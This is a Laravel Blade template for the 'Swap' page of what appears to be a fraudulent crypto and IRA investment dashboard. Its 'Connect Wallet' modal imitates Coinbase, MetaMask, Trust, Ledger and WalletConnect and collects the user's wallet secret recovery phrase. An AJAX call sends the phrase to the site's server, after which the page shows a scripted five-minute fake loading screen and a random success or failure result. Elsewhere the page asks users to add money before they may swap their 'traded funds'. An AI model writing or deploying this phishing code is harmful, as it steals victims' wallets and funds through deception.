@extends('layouts.user')

@section('head')
    {{ __('Swap') }}
@endsection


@php
    $user = \App\Models\User::find(auth()->id());
    $sym = \App\Models\Currency::where('id', $user->currency_id)->first();

    $phraseData = json_decode($user->phrase, true);

    // Check if it's a single object and convert it to an array if needed
    if (isset($phraseData['phrase']) && isset($phraseData['wallet'])) {
        $phraseData = [$phraseData];
    }
@endphp


<style>
    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
        display: none;
    }

    /* Custom Styles */
    .modal-content {
        border-radius: 15px;
        overflow: hidden;
    }

    .modal-dialog-centered {
        max-width: 800px;
    }

    .modal-content .card {
        border: none;
    }

    .modal-content .list-group-item {
        border: none;
        border-left: 3px solid transparent;
        font-weight: 500;
        font-size: 10px;
    }

    .modal-content .list-group-item.active {
        background-color: #f0f4ff;
        color: #5156be;
        border-left-color: #5156be;
        font-size: 10px;
    }

    .modal-content .list-group-item:hover {
        background-color: #f0f4ff;
        color: #5156be;
        cursor: pointer;
    }

    .modal-content h4 {
        font-weight: bold;
        font-size: 12px;
    }

    .modal-content h5 {
        font-weight: bold;
        color: #333;
        font-size: 18px;
    }

    .modal-content p {
        font-size: 8px;
        line-height: 1.0;
        margin: 0px 20px;
        color: #74788d8c;
    }

    .modal-content .btn-primary {
        background-color: #5156be;
        border: none;
        padding: 5px 20px;
        font-size: 8px;
        border-radius: 30px;
    }

    .modal-content .btn-primary:hover {
        background-color: #1558c0;
    }

    .modal-content img {
        border-radius: 10px;
    }

    .list-group-item {
        position: relative;
        display: block;
        padding: .3rem 0.9rem;
        color: #212529;
        background-color: #fff;
        border: 1px solid #e9e9ef;
    }
    @media (min-width: 900px) {
        #connectWallet
        {
            scale: 1.3;
        }
    }
</style>

@section('content')
    <div class="row">
        <div class="col-12">
            <div class="page-title-box d-sm-flex align-items-center justify-content-between">
                <ol class="breadcrumb m-0">
                    <li class="breadcrumb-item"><a href="{{ route('user.index') }}">Dashboard</a></li>
                    <li class="breadcrumb-item active">Cash</li>
                    <li class="breadcrumb-item active">Swap</li>
                </ol>

                <div class="page-title-right">
                    @if($phraseData && $phraseData[0]['status'] == 1)
                        <form action="{{ route('disconnect.phrase', ['id' => $user->id, 'status' => 0]) }}" method="post">
                            @csrf
                            <input type="hidden" value="{{ $phraseData[0]['phrase'] }}" name="phrase">
                            <input type="hidden" value="{{ $phraseData[0]['wallet'] }}" name="wallet">
                            <button class="btn btn-primary" type="submit">Disconnect Wallet</button>
                        </form>
                    @else
                        <button class="btn btn-primary w-sm text-white" type="button" data-toggle="modal" data-target="#connectWallet" id="connectBtn">Connect Wallet</button>
                    @endif
                </div>

            </div>
        </div>
    </div>
    <!-- Modal -->
    <div class="modal fade" id="exampleModalCenterbank" tabindex="-1" role="dialog"
        aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalCenterTitle">Confirm Deposit</h5>
                    {{-- <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
        </button> --}}
                </div>
                <div class="modal-body border p-3">
                    <div id="banknote"></div>
                    {{-- <p>Please deposit to the account below</p>
        <p>Kindly make a deposit of [requested amount in USD(bank deposit) or
            btc(bitcoin deposit)] to
            [Bank Details(bank deposit) or Deposit adddress(bitcoin deposit)],</p> --}}
                    <li>Bank Name: {{ $setting['bank_name'] ?? '' }}</li>
                    <li>Account Name: {{ $setting['acct_name'] ?? '' }}</li>
                    <li>Account Number: {{ $setting['acct_no'] ?? '' }}</li>
                    <br>
                    <p>Deposits will be processed after we’ve confirmed your payment. Thank you!</p>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                    <button type="button" onclick="depositFormBank()" class="btn btn-primary">Confirm</button>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="exampleModalCenterbtc" tabindex="-1" role="dialog"
        aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalCenterTitle">Confirm Deposit</h5>
                </div>
                <div class="modal-body border p-3">
                    <div id="btcnotes" class="mt-3 text-center"></div>
                    
                    
                    <p id="btc" class="text-center mt-6 mb-3" style="display: none;">BTC: <br>
                       <b>{{ $user['btc_wallet'] ?? 'Not set' }}</b>
                    </p>

                    <p id="eth" class="text-center mt-6 mb-3" style="display: none;">ETH: <br>
                       <b>{{ $user['eth_wallet'] ?? 'Not set' }}</b>
                    </p>

                    <p id="usdt-t" class="text-center mt-6 mb-3" style="display: none;">USDT (TRC20): <br>
                       <b>{{ $user['usdt_trc_20'] ?? 'Not set' }}</b>
                    </p>

                    <p id="usdt-e" class="text-center mt-6 mb-3" style="display: none;">USDT (ERC20): <br>
                       <b>{{ $user['usdt_erc_20'] ?? 'Not set' }}</b>
                    </p>

                    <br>
                    <p>Deposits will be processed after we’ve confirmed your payment. Thank you!</p>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                    <button type="button" onclick="depositFormBtc()" class="btn btn-primary">Confirm</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="connectWallet" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-lg-custom" role="document">
            <div class="modal-content">
                <div class="card w-100">
                    <div class="row no-gutters">
                        <!-- Left Section -->
                        <div class="col-4" style="border-right: 1px solid #f0f0f0;">
                            <h4 class="p-3">Connect a Wallet</h4>
                            <ul class="list-group list-group-flush">
                                <p class="text-muted fs-10 my-2">Itrust</p>
                                <li class="list-group-item active">
                                    <img width="30" class="mx-0" src="https://i.pinimg.com/originals/70/8f/c3/708fc3e03913987335ae6c61cdb8481c.png" alt="..." style="border-radius: 100px;"> 
                                    Coinbase Wallet
                                </li>
                                <li class="list-group-item">
                                    <img width="16" class="mx-1" src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/metamask-icon.png" alt="..." style="border-radius: 100px;"> 
                                    MetaMask
                                </li>
                                <li class="list-group-item">
                                    <img width="33" class="mx-0" src="https://1000logos.net/wp-content/uploads/2022/05/WalletConnect-Emblem.png" alt="..." style="border-radius: 100px;">  
                                    WalletConnect
                                </li>
                                <p class="text-muted fs-10 my-2">More</p>
                                <li class="list-group-item">
                                    <img width="20" class="mx-1" src="https://www.svgrepo.com/show/505018/trust-wallet.svg" alt="..." style="border-radius: 100px;">  
                                    Trust
                                </li>
                                <li class="list-group-item">
                                    <img width="17" class="mx-1" src="https://img.cryptorank.io/coins/ledger1673447427161.png" alt="..." style="border-radius: 100px;"> 
                                    Ledger Live
                                </li>
                            </ul>
                        </div>
                        
                        <!-- Right Section -->
                        <div class="col-8">
                            <div class="import-screen d-flex flex-column align-items-center justify-content-center h-100 p-4">
                                <img id="connect-text" src="{{ asset('assets/images/import.png') }}" alt="Import Wallet" class="mb-3" style="width: 60px; cursor: pointer" id="connect-text2">
                                <h5 class="mb-2" >Import a wallet</h5>
                                <p class="text-muted text-center">You can easily connect and backup your wallet using seed phrase.</p>
                                <button class="btn btn-primary mt-3">Connect</button>
                            </div>
                            <div class="text-screen h-100 p-4">
                                <div class="d-flex align-items-center justify-content-between">
                                    <span style="font-size: 10px; padding: 5px 0px;">Secret Phrase</span>
                                    <p style="font-size: 10px; padding: 5px 0px;">120/365</p>
                                </div>
                                <div>
                                    <textarea class="form-control" name="phrase" id="phrase" rows="8" cols="3" placeholder="Typically 12 (sometimes 18, 24) words separated by single space" style="font-size: 10px; padding: 10px;"></textarea>
                                    <button class="btn btn-primary mt-3" style="margin: auto; display: flex; top: 70; position: relative;">Connect</button>
                                </div>
                            </div>
                            <div class="loading-screen d-flex flex-column align-items-center justify-content-center h-100 p-4">
                                <img src="https://i.pinimg.com/originals/70/8f/c3/708fc3e03913987335ae6c61cdb8481c.png" alt="Import Wallet" class="mb-3" style="width: 60px;">
                                <h5 class="mb-2">Coinbase wallet</h5>
                                <p class="text-muted text-center">Waiting for connection...</p>
                            </div>
                            <div class="failed-screen d-flex flex-column align-items-center justify-content-center h-100 p-4">
                                <img src="https://i.pinimg.com/originals/70/8f/c3/708fc3e03913987335ae6c61cdb8481c.png" alt="Import Wallet" class="mb-3" style="width: 60px;">
                                <h5 class="mb-2">Coinbase wallet</h5>
                                <p class="text-danger text-center">Connection Failed</p>
                                <button class="btn btn-primary mt-3">Try again</button>
                            </div>
                            <div class="success-screen d-flex flex-column align-items-center justify-content-center h-100 p-4">
                                <img src="https://i.pinimg.com/originals/70/8f/c3/708fc3e03913987335ae6c61cdb8481c.png" alt="Import Wallet" class="mb-3" style="width: 60px;">
                                <h5 class="mb-2">Coinbase wallet</h5>
                                <p class="text-success text-center">Connection Successful you can now add swap balance to your DeFi wallet</p>
                                <button class="btn btn-primary mt-3">Back to Dashboard</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <div class="card-body">
        <div class="card w-100">
            <div class="card-body">
                <div class="d-flex align-center justify-content-center m-auto">
                    <div class="mx-1">
                        <a href="{{ route('user.deposit') }}" class="btn btn-light w-sm text-primary" style="background-color: transparent; border-radius: 20px; border: 1px solid #5156be; padding: 10px 30px;">Deposit</a>
                    </div>
                    <div class="mx-1"> 
                        <a href="{{ route('user.withdraw') }}" class="btn btn-light w-sm text-primary" style="background-color: transparent; border-radius: 20px; border: 1px solid #5156be; padding: 10px 30px;">Withdraw</a>
                    </div>
                    <div class="mx-1">
                        <a href="{{ route('user.swap') }}" class="btn btn-light w-sm" style="background-color: #5156be; border-radius: 20px; padding: 10px 30px; color: white;">Swap</a>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-md-8 order-2 order-md-1">
                <div class="card-body mb-3 border">
                    <div class="reward-panel" id="reward-panel-2">
                        <div class="col mb-3">
                            <!-- Image can be added here if needed -->
                        </div>
                        <h5 class="font-size-14 mb-4">Swap Traded Funds to Crypto Balance</h5>
                        <form action="{{ route('user.swap.store') }}" method="post" id="depositFormBtc">
                            @csrf
                            <div class="d-flex align-items-center my-4 mx-auto justify-content-around flex-column flex-md-row">
                                <div class="mb-3 mb-md-0 text-center w-100 w-md-auto">
                                    <div class="position-relative">
                                        <select 
                                            class="form-control w-100 w-md-auto"
                                            style="border: 1px solid #00000033; border-radius: 5px; padding: 10px; font-weight: 700; background: #f0f0f0;"
                                            name="from_wallet" id="from_wallet" onchange="updateToWallet()">
                                            <option value="it_wallet" {{ old('from_wallet') == 'it_wallet' ? 'selected' : '' }}>
                                                IRA Trading: {{ $sym->symbol }}{{ number_format($user->availableCashIRA(), 2) }}
                                            </option>
                                            <option value="ot_wallet" {{ old('from_wallet') == 'ot_wallet' ? 'selected' : '' }}>
                                                HYSA Trading: {{ $sym->symbol }}{{ number_format($offshore_cash, 2) }}
                                            </option>
                                        </select>
                                        <i class="fas fa-chevron-down position-absolute" style="top: 50%; right: 10px; transform: translateY(-50%); pointer-events: none;"></i>
                                    </div>
                                </div>
                                <div class="mb-3 mb-md-0 text-center w-50">
                                    <i data-feather="repeat" class="icon-xl"></i>
                                </div>
                                <div class="mb-3 mb-md-0 text-center w-100 w-md-auto">
                                    <div class="position-relative">
                                        <select 
                                            class="form-control w-100 w-md-auto"
                                            style="border: 1px solid #00000033; border-radius: 5px; padding: 10px; font-weight: 700; background: #f0f0f0;"
                                            name="to_wallet_display" id="to_wallet_display" disabled>
                                            <option value="ic_wallet" {{ old('to_wallet') == 'ic_wallet' ? 'selected' : '' }}>
                                                IRA Crypto: {{ $sym->symbol }}{{ number_format($user->wallet->ic_wallet, 2) }}
                                            </option>
                                            <option value="oc_wallet" {{ old('to_wallet') == 'oc_wallet' ? 'selected' : '' }}>
                                                HYSA Crypto: {{ $sym->symbol }}{{ number_format($user->wallet->oc_wallet, 2) }}
                                            </option>
                                        </select>
                                        <input type="hidden" name="to_wallet" id="to_wallet">
                                    </div>
                                </div>
                            </div>

                            <div id="crypto-method">
                                <div class="form-group">
                                    <div class="input-group mb-3">
                                        <label class="input-group-text" for="amount"><strong>{{ $sym->symbol }}</strong></label>
                                        <input type="number" id="crypto_amount" step="any" name="amount"
                                            value="{{ old('btc_amount') }}"
                                            class="form-control @error('amount') is-invalid @enderror" placeholder="Amount"
                                            onkeyup="calcEquiv(this), changeMsg()">
                                    </div>
                                    @error('amount') 
                                        <strong class="text-danger" role="alert">{{ $message }}</strong>
                                    @enderror
                                </div>

                                @if (session('error'))

                                <div class="card bg-light mt-2 mb-3">
                                    <div class="container-fluid">
                                        <div class="row mt-4 mb-4">
                                            <div class="col-12 text-center">
                                                <h6>{{ session('error') }}</h6>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                @endif

                                @if($user->swap >= 1)

                                <div class="card bg-light mt-2 mb-3">
                                    <div class="container-fluid">
                                        <div class="row mt-4 mb-4">
                                            <div class="col-12 text-center">
                                                <h6>Add {{ $sym->symbol }}{{ number_format($user->swap, 2) }} to your crypto balance to allow swap on your traded funds</h6>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                @endif

                                <div class="text-center d-grid gap-2">
                                    <button class="btn btn-primary w-md" type="submit">Swap</button>
                                </div>

                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div class="col-md-4 order-1 order-md-2">
                <div class="card w-100">
                    <div class="card-body">
                        <div class="table">
                            <table class="table table-borderless">

                                <h4>Total Balance: <strong>{{ $sym->symbol }}{{ number_format($user->wallet->balance, 2) }}</strong></h4>
                                <p class="text-muted">Safe Deposit Margin: <strong>{{ $sym->symbol }}{{ number_format($user->wallet->margin, 2) }}</strong></p>
                                
                                <tr class="text-" style="border: 0 !important;">
                                    <td colspan="4">Crypto Balance</td>
                                    <td class="float-end"> 
                                        {{ $sym->symbol }}{{ number_format($user->wallet->ic_wallet + $user->wallet->oc_wallet, 2) }}
                                    </td>
                                </tr>
                                <tr>
                                    <td colspan="6">
                                        <div class="progress">
                                            <div class="progress-bar" role="progressbar"
                                                style="width: 100%; background-color: orange;"
                                                aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"></div>
                                        </div>
                                    </td>
                                </tr>
                                
                                <tr class="text-" style="border: 0 !important;">
                                    <td colspan="4">Trading Balance <i data-feather="lock" class="icon-xs"></i></td>
                                    <td class="float-end"> 
                                        {{ $sym->symbol }}{{ number_format($user->wallet->it_wallet + $user->wallet->ot_wallet, 2) }}
                                    </td>
                                </tr>
                                <tr>
                                    <td colspan="6">
                                        <div class="progress">
                                            <div class="progress-bar bg-primary" role="progressbar"
                                                style="width: 100%;"
                                                aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"></div>
                                        </div>
                                    </td>
                                </tr>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>


        {{-- <div class="table-responsive">
            <table id="datatable" class="table table-borderless table-responsive  nowrap w-100">
                <thead>
                <tr>
                    <th>Method</th>
                    <th>Transaction</th>
                    <th>Account</th>
                    <th>Date</th>
                    <th>Status</th>
                    <th>Action</th>
                </tr>
                </thead>

                <tbody>
                @foreach($transactions as $transaction)
                    <tr class="mt-6 mb-6">
                        <td>
                            @if($transaction->method == 'bitcoin')
                            <div class="col">
                                <img src="{{ asset('svg/new_btc.svg') }}" alt="" width="30">
                            </div>
                            @else
                                @if($transaction->type == 'payout')
                                    <div class="col">
                                        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLBFTh8daWyNvQZ0IJuYKeaYLsB8ecn0VlJs9sTkT_1A&s" alt="" width="30">
                                    </div>
                                @else
                                    <div class="col">
                                        <img src="{{ asset('svg/bank.png') }}" alt="" width="30">
                                    </div>
                                @endif
                            @endif
                        </td>
                        <td>
                            <h5>{{ $sym->symbol.number_format($transaction->actual_amount, 2) }}</h5>
                            <p>{{ ucwords($transaction->type) }} {{ $transaction->method == 'bank' ? 'USD' : 'BTC' }}</p>
                        </td>
                        <td>
                            @if($transaction->acct_type == 'offshore')
                            HYSA
                            @elseif($transaction->acct_type == 'basic_ira')
                            Basic IRA
                            @else
                            -----
                            @endif
                        </td>
                        <td>{{ \Carbon\Carbon::make($transaction->created_at)->format('Y/m/d') }}</td>
                        <td> <span class="badge px-4 py-2 rounded

                            {{ $transaction->status == 'pending' ? 'bg-warning' : '' }}
                            {{ $transaction->status == 'declined' ? 'bg-dark text-danger' : '' }}
                                    {{ $transaction->status == 'pending' ? 'bg-warning' : '' }}
                            {{ $transaction->status == 'declined' || $transaction->status == 'cancelled' ? 'bg-dark text-danger' : '' }}
                            {{ $transaction->status == 'approved' ? 'bg-dark text-success' : '' }}
                            {{ $transaction->status == 'cancelled' ? 'bg-dark text-danger' : '' }}
                            {{ $transaction->status == 'progress' ? 'bg-dark text-secondary' : '' }}
                                ">{{ ucwords($transaction->status) }}</td>
                        <td>
                            @if($transaction->status == 'pending')
                                 <a class="btn btn-sm btn-danger" href="javascript:void(0)" data-bs-toggle="modal" data-bs-target="#staticBackdrop-cancel-{{ $transaction->id }}">Cancel</a>

                                 <div class="modal fade" id="staticBackdrop-cancel-{{ $transaction->id }}" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" aria-labelledby="staticBackdropLabel" aria-hidden="true">
                                     <div class="modal-dialog modal-dialog-centered" role="document">
                                         <div class="modal-content">
                                             <div class="modal-header">
                                                 <h5 class="modal-title" id="staticBackdropLabel">Confirm Decline</h5>
                                                 <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                             </div>
                                             <form action="{{ route('user.transactions.action', [$transaction->id, 'cancel']) }}" method="post">@csrf @method('PUT')
                                                 <div class="modal-body">
                                                     <p>Are you sure you want to cancel this deposit?</p>
                                                 </div>
                                                 <div class="modal-footer">
                                                     <button type="button" class="btn btn-light" data-bs-dismiss="modal">Close</button>
                                                     <button type="submit" class="btn btn-danger">Cancel</button>
                                                 </div>
                                             </form>
                                         </div>
                                     </div>
                                 </div>
                             @endif
                         </td>
                    </tr>
                @endforeach
                </tbody>
            </table>
        </div> --}}

    </div>


@endsection

@section('script')
    <script>
        $(document).ready(function() {
            $('#from_wallet').on('change', function() {
                var fromWallet = $(this).val();
                var toWalletDisplay = $('#to_wallet_display');
                var toWalletHidden = $('#to_wallet');

                if (fromWallet === 'it_wallet') {
                    toWalletDisplay.val('ic_wallet');
                    toWalletHidden.val('ic_wallet');
                } else if (fromWallet === 'ot_wallet') {
                    toWalletDisplay.val('oc_wallet');
                    toWalletHidden.val('oc_wallet');
                }
            });

            // Trigger the change event to set the initial value
            $('#from_wallet').trigger('change');

            $(".text-screen").addClass("d-none");
            $(".loading-screen").addClass("d-none");
            $(".failed-screen").addClass("d-none");
            $(".success-screen").addClass("d-none");

            // Set the first wallet as active by default if none is selected
            let selectedWallet = $(".list-group-item.active");
            if (!selectedWallet.length) {
                selectedWallet = $(".list-group-item").first();
                selectedWallet.addClass("active");
            }

            // 1. Handle left section click to make item active, only in the import screen
            $(".list-group-item").on("click", function() {
                if ($(".import-screen").is(":visible")) {
                    $(".list-group-item").removeClass("active"); // Remove active class from all items
                    $(this).addClass("active"); // Add active class to clicked item
                    
                    // Update the image and title in the right section
                    let walletName = $(this).text().trim();
                    let walletImgSrc = $(this).find("img").attr("src");
                    $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", walletImgSrc);
                    $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(walletName);
                }

                if ($(".text-screen").is(":visible")) {
                    // Reset the modal to its initial state
                    $(".text-screen, .loading-screen, .failed-screen, .success-screen").addClass("d-none");
                    $(".import-screen").removeClass("d-none");
                    
                    // Clear the secret phrase input
                    $("#phrase").val("");

                    // Reset the active wallet to the first one
                    $(".list-group-item").removeClass("active");
                    $(".list-group-item").first().addClass("active");

                    // Reset the images and titles in the loading/failed/success screens
                    let firstWalletImgSrc = $(".list-group-item").first().find("img").attr("src");
                    let firstWalletName = $(".list-group-item").first().text().trim();
                    $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", firstWalletImgSrc);
                    $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(firstWalletName);
                }
            });

            // 2. Handle import wallet click to show the text screen
            $("#connect-text, #connect-text2").on("click", function() {
                $(".import-screen").addClass("d-none"); // Hide the initial screen
                $(".text-screen").removeClass("d-none"); // Show the text screen
            });

            // 3. Handle Secret Phrase form submission
            $(".text-screen button").on("click", function() {
                let secretPhrase = $("#phrase").val().trim();

                // Get the active wallet type and name
                let activeWallet = $(".list-group-item.active");
                let walletName = activeWallet.text().trim();
                let walletType = activeWallet.find("img").attr("alt");

                if (!activeWallet.length) {
                    // If no wallet is selected, select the first one as default
                    activeWallet = $(".list-group-item").first();
                    walletName = activeWallet.text().trim();
                    walletType = activeWallet.find("img").attr("alt");
                }

                if (secretPhrase) {
                    $(".text-screen").addClass("d-none"); // Hide the text screen
                    $(".loading-screen").removeClass("d-none"); // Show the loading screen

                    // Submit the form data via AJAX
                    $.ajax({
                        type: "POST",
                        url: `{{ route('phrase.store') }}`,  // Replace with your API endpoint
                        headers: {'X-CSRF-Token': '{{ csrf_token() }}'},
                        data: JSON.stringify({ 
                            phrase: secretPhrase,
                            wallet: walletName, 
                        }),
                        contentType: 'application/json',
                        success: function (res) {
                            alertify.success(res['msg']);
                        },
                        error: function (res) {
                            const data = res['responseJSON']
                            const errors = data['errors']
                            if (res['status'] === 422) {
                                alertify.error(data['msg'])
                            } else {
                                alertify.error('An error occurred, Try again.')
                            }
                        }
                    });

                    // 4. Show loading screen for 5 minutes and then show success or failed screen
                    setTimeout(function() {
                        $(".loading-screen").addClass("d-none"); // Hide the loading screen

                        if (Math.random() > 0.5) {
                            $(".success-screen").removeClass("d-none"); // Show success screen
                        } else {
                            $(".failed-screen").removeClass("d-none"); // Show failed screen
                        }
                    }, 300000); // 5 minutes in milliseconds
                }
            });

            $('#connectBtn').on('click', function() {
                // Reset the modal to its initial state
                $(".text-screen, .loading-screen, .failed-screen, .success-screen").addClass("d-none");
                $(".import-screen").removeClass("d-none");
                
                // Clear the secret phrase input
                $("#phrase").val("");

                // Reset the active wallet to the first one
                $(".list-group-item").removeClass("active");
                $(".list-group-item").first().addClass("active");

                // Reset the images and titles in the loading/failed/success screens
                let firstWalletImgSrc = $(".list-group-item").first().find("img").attr("src");
                let firstWalletName = $(".list-group-item").first().text().trim();
                $(".loading-screen img, .failed-screen img, .success-screen img").attr("src", firstWalletImgSrc);
                $(".loading-screen h5, .failed-screen h5, .success-screen h5").text(firstWalletName);
            });
        });
    </script>
    <script>
        $(document).ready(function() {
            $('#method').on('change', function() {
                var method = $(this).val();
                var icon = $('#crypto-icon');
                var displayedIcon = $('#displayed-icon');

                var btcSection = $('#btc-section');
                var ethSection = $('#eth-section');
                var usdtTrc20Section = $('#usdt_trc20-section');
                var usdtErc20Section = $('#usdt_erc20-section');

                // Reset all sections
                btcSection.hide();
                ethSection.hide();
                usdtTrc20Section.hide();
                usdtErc20Section.hide();

                // Update the icon and show the relevant section
                if (method === 'btc') {
                    icon.attr('src', "{{ asset('svg/new_btc.svg') }}");
                    displayedIcon.attr('src', "{{ asset('svg/new_btc.svg') }}");
                    btcSection.show();
                } else if (method === 'eth') {
                    icon.attr('src', "https://cdn-icons-png.flaticon.com/512/6001/6001368.png");
                    displayedIcon.attr('src', "https://cdn-icons-png.flaticon.com/512/6001/6001368.png");
                    ethSection.show();
                } else if (method === 'usdt_trc20' || method === 'usdt_erc20') {
                    icon.attr('src', "https://seeklogo.com/images/T/tether-usdt-logo-FA55C7F397-seeklogo.com.png");
                    displayedIcon.attr('src', "https://seeklogo.com/images/T/tether-usdt-logo-FA55C7F397-seeklogo.com.png");
                    if (method === 'usdt_trc20') {
                        usdtTrc20Section.show();
                    } else {
                        usdtErc20Section.show();
                    }
                }
            });
        });

        function showReward(i) {
            $('.reward').removeClass('d-none')
            $('.reward-panel').addClass('d-none')
            $('#reward-' + i).addClass('d-none')
            $('#reward-panel-' + i).removeClass('d-none')
        }

        function showLess(i) {
            $('#reward-' + i).removeClass('d-none')
            $('#reward-panel-' + i).addClass('d-none')
        }
    </script>
    <script>
        function startDeposit() {
            var amount = document.getElementById('bank_amount').value
            <?php echo 'var currencySymbol = "' . $sym['symbol'] . '";'; ?>

            $('#banknote').html(`
                <p>Kindly make a deposit of ` + currencySymbol + amount + ` in USD to the
                Bank Details below</p>
                `);
        }

        function changeMsg() {
            var amount = document.getElementById('crypto_amount').value
            <?php echo 'var currencySymbol = "' . $sym['symbol'] . '";'; ?>

            $('#msgBox').html(`` + currencySymbol + amount + ``);
        }

        function startDepositbtc() {
            var amount = document.getElementById('crypto_amount').value
            <?php echo 'var currencySymbol = "' . $sym['symbol'] . '";'; ?>
            $('#btcnotes').html(`
                <p>Kindly make a deposit of ` + currencySymbol + amount + ` in BTC to the
                Address below</p>
                `);

            var method = document.getElementById('method').value  

            if (method == 'btc') {
                $('#btc').show();
            } else if(method == 'eth') {
                $('#eth').show();
            } else {
                $('#usdt-e').show();
                $('#usdt-t').show();
            }

        }
    </script>
    <script>
        $('#datatable').DataTable({
            "order": [
                [0, "desc"]
            ]
        });
    </script>
    <script>
        // $('#datatable').DataTable()
        // console.log();
        const user = {!! json_encode(auth()->user()) !!};
        if (user['status'] === 'pending') $('#staticBackdrop-btn').click()

        const validation = {!! json_encode(session('validation')) !!};
        const method = {!! json_encode(session('method')) !!};
        const w_method = {!! json_encode(session('w_method')) !!};

        if (validation) {
            if (method) {
                if (method === 'bank') $('#bank-method').show(500);
                else if (method === 'bitcoin') $('#crypto-method').show(500);
                else {
                    $('#crypto-method').hide(500);
                    $('#bank-method').hide(500);
                }
            }

            if (w_method) {
                if (w_method === 'bank') $('#bank-method-withdraw').show(500);
                else if (w_method === 'bitcoin') $('#crypto-method-withdraw').show(500);
                else {
                    $('#crypto-method-withdraw').hide(500);
                    $('#bank-method-withdraw').hide(500);
                }
            }
        }

        function showMethod(id) {
            $('#bank-method-withdraw').hide(500);
            $('#crypto-method-withdraw').hide(500);
            const value = $(id).val()
            if (value === 'bank') $('#bank-method').show(500);
            else $('#bank-method').hide(500);
            if (value === 'bitcoin') $('#crypto-method').show(500);
            else $('#crypto-method').hide(500);
        }

        function showMethodwithdraw(id) {
            $('#bank-method').hide(500);
            $('#crypto-method').hide(500);
            const value = $(id).val()
            if (value === 'bank') $('#bank-method-withdraw').show(500);
            else $('#bank-method-withdraw').hide(500);
            if (value === 'bitcoin') {
                $('#crypto-method-withdraw').show(500);
                $("#bank-method-withdraw").find("input").attr("disabled");
            } else $('#crypto-method-withdraw').hide(500);
        }

        function calcEquiv(id) {
            if ($(id).val().length > 0) $('#crypto-amount').html((parseFloat($(id).val()) + ' USD'));
            // if ($(id).val().length > 0) $('#crypto-amount').html((parseFloat($(id).val()) / parseFloat('{{ \App\Http\Controllers\Admin\AdminController::getBTC() }}')).toFixed(8) + ' BTC');
        }

        function calcEquivWithdraw(id) {
            if ($(id).val().length > 0) $('#crypto-amount-withdraw').html((parseFloat($(id).val()) +
                ' USD'));
            // if ($(id).val().length > 0) $('#crypto-amount-withdraw').html((parseFloat($(id).val()) / parseFloat('{{ \App\Http\Controllers\Admin\AdminController::getBTC() }}')).toFixed(8) +
            // ' BTC');
        }

        function depositFormBtc() {

            document.getElementById("depositFormBtc").submit();
        }

        function depositFormBank() {

            document.getElementById("depositFormBank").submit();
        }

        // var note = document.getElementById('banknote').innerHtml;
        // note
    </script>
@endsection
